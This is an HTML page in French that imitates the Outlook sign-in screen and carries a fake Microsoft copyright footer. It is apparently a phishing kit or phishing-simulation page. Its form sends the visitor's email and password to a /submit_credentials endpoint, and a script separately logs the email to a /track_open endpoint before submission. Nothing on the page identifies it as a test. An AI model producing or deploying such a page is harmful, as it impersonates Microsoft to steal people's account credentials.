<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook - Connexion</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            width: 400px;
        }
        h2 {
            text-align: center;
            color: #0078d4;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            font-size: 14px;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-top: 5px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #005a99;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Se connecter à Outlook</h2>
        <form action="/submit_credentials" method="POST">
            <div class="form-group">
                <label for="email">Adresse email ou numéro de téléphone</label>
                <input type="text" id="email" name="email" placeholder="Entrez votre email" required>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
        <div class="footer">
            <p>&copy; 2025 Microsoft. Tous droits réservés.</p>
        </div>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function () {
        let form = document.querySelector("form");

        form.addEventListener("submit", function (event) {
            let emailInput = document.querySelector("input[id='email']");
            
            if (emailInput && emailInput.value.trim() !== "") {
                let email = encodeURIComponent(emailInput.value);
                
                // Effectuer une requête à /track_open AVANT d'envoyer le formulaire
                fetch(`/track_open?email=${email}`)
                    .then(response => console.log("Tracking enregistré pour " + email))
                    .catch(error => console.error("Erreur tracking :", error));
            }
        });
    });
    </script>
</body>
</html>
